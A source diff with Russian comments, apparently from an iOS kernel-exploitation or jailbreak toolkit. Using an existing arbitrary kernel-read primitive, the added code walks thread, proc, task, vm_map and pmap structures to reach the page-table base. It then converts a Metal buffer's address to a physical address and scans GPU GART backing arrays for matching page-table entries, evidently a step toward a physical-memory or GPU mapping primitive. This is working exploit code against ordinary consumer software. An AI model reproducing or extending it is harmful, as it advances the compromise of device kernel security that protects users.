@@ -5230,6 +5230,9 @@ static void *kpParkWorker(void *arg)
 
 extern uint64_t kp_rc_kread64(uint64_t);
 
+static void *gBufContents = NULL;
+static id gGartBuf = nil; // удерживаем MTLBuffer живым между стадиями
+
 // Дамп pointer-полей объекта: ТОЛЬКО значения, без дереференсов (дереф по
 // physmap в выключенный carveout = аппаратный ресет без паник-лога, проверено).
 static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name, uint32_t size)
@@ -5315,6 +5318,8 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
             id<MTLBuffer> buf = [mtl newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
             if (buf) {
                 memset(buf.contents, 0x42, 0x10000);
+                gBufContents = buf.contents;
+                gGartBuf = buf;
                 kpNote(r, [NSString stringWithFormat:@"  Metal buf contents=%p gpuAddress=%#llx",
                            buf.contents, (unsigned long long)buf.gpuAddress]);
             } else kpNote(r, @"  Metal buf: FAIL");
@@ -5340,6 +5345,35 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
             if (kpLooksLikeKernelPointer(backing)) {
                 for (uint32_t o = 0; o < 0x88; o += 8)
                     kpNote(r, [NSString stringWithFormat:@"    backing+%#04x = %#llx", o, kp_rc_kread64(backing + o)]);
+                // эмпирическая идентификация fPageTablePtrs: наши физадреса буфера
+                // (через собственный pmap) должны лежать в PTE-таблице
+                mach_port_t tp = mach_thread_self();
+                uint64_t tva = [self rcResolveThreadKVA:tp];
+                mach_port_deallocate(mach_task_self(), tp);
+                uint64_t tro = kp_untag_ptr(kp_rc_kread64(tva + 0x3E8));
+                uint64_t selfProc = kp_untag_ptr(kp_rc_kread64(tro + off_thread_ro_tro_proc));
+                uint64_t p_ro = kp_untag_ptr(kp_rc_kread64(selfProc + off_proc_p_proc_ro));
+                uint64_t selfTask = kp_untag_ptr(kp_rc_kread64(p_ro + off_proc_ro_pr_task));
+                uint64_t map = kp_untag_ptr(kp_rc_kread64(selfTask + off_task_map));
+                uint64_t pmap = kp_untag_ptr(kp_rc_kread64(map + koffsetof(vm_map, pmap)));
+                uint64_t ttep = kp_untag_ptr(kp_rc_kread64(pmap + koffsetof(pmap, ttep)));
+                extern uint64_t vtophys(uint64_t, uint64_t);
+                kpNote(r, [NSString stringWithFormat:@"  ttep=%#llx", ttep]);
+                if (ttep && gBufContents) {
+                    uint64_t pa0 = vtophys(ttep, (uint64_t)gBufContents);
+                    kpNote(r, [NSString stringWithFormat:@"  buf contents=%p pa0=%#llx", gBufContents, pa0]);
+                    // скан массивов backing: ищем PTE с нашим PA
+                    for (uint32_t o = 0x28; o <= 0x48; o += 8) {
+                        uint64_t arr = kp_untag_ptr(kp_rc_kread64(backing + o));
+                        if (!kpLooksLikeKernelPointer(arr)) continue;
+                        NSMutableString *line = [NSMutableString stringWithFormat:@"    arr[+%#x] @ %#llx:", o, arr];
+                        for (int j = 0; j < 8; j++) {
+                            uint64_t e = kp_rc_kread64(arr + (uint64_t)j * 8);
+                            [line appendFormat:@" %#llx%@", e, (pa0 && (e & ~0x3fffULL) == (pa0 & ~0x3fffULL)) ? @"←PTE!" : @""];
+                        }
+                        kpNote(r, line);
+                    }
+                }
             }
         }
     }
